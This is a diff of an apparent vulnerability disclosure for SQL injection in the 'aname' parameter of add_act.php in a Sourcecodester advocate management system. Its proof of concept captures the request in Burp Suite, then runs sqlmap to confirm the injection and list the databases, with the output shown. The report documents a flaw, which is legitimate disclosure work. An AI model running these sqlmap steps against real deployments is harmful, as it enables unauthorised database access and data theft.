@@ -6,27 +6,29 @@ title: Sourcecodester advocate management system (add_act.php)
 http://localhost/kortex_lite/kortex_lite/control/add_act.php
 
 
-## Report
+## Details
 
-Related Code file: /control/add_act_.php
+### Related Code file: 
+`/control/add_act_.php`
 
-Injection parameter: MULTIPART aname
+### Injection parameter: 
+`MULTIPART aname`
 
-POST parameter 'MULTIPART aname' is vulnerable.
 
-![1](https://github.com/user-attachments/assets/2ac11e6e-0bc7-4237-b6b5-fd849060ead0)
+## POC
+
+![101](https://github.com/user-attachments/assets/08f216aa-7f7a-4e1f-b24a-e1a6fbccae96)
 
 Intercept request using Burpsuite Proxy.
 
-![2](https://github.com/user-attachments/assets/4e01c27e-2b1f-4968-8264-7cbe95dc6fc5)
+![102](https://github.com/user-attachments/assets/53f98839-746f-461b-a1d7-70aeb45f1db7)
 
-Save the request to `add_act.txt`.
-
+Save the request to `control.add_act.txt`.
 
 ### Verify vulnerability
 
 ```
-sqlmap -r add_act.txt --batch
+sqlmap -r control.add_act.txt --batch
 ```
 
 ![51](https://github.com/user-attachments/assets/33cbe30f-640d-42cb-a5f2-19d0ab89e9a3)
@@ -42,7 +44,16 @@ Content-Disposition: form-data; name="aname"
 ### Dump databases
 
 ```
-sqlmap -r add_act.txt --batch --dbs
+sqlmap -r control.add_act.txt --batch --dbs
 ```
 
-![52](https://github.com/user-attachments/assets/6996d06c-b036-4155-a612-4200f23dc671)
+![154](https://github.com/user-attachments/assets/e4498d58-3d53-4475-b1c5-a83199184f34)
+
+```
+[04:20:26] [INFO] fetching database names
+[04:20:26] [INFO] resumed: 'information_schema'
+[04:20:26] [INFO] resumed: 'kortex_lite'
+available databases [2]:
+[*] information_schema
+[*] kortex_lite
+```
